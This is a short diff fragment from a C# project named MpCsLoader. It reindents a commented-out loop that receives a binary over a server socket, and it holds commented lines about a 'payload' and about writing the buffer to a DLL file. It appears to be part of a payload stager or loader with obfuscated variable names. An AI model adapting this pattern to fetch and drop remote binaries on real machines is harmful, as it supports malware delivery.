@@ -77,8 +77,8 @@ namespace MpCsLoader
                       #conn.put(p)      <----- no need for payload
 
                  * 
-                                while (PmUVgiyFcZ < RUgJAb)
-                                { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }
+                while (PmUVgiyFcZ < RUgJAb)
+                { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }
                                 */
                 //File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
                 
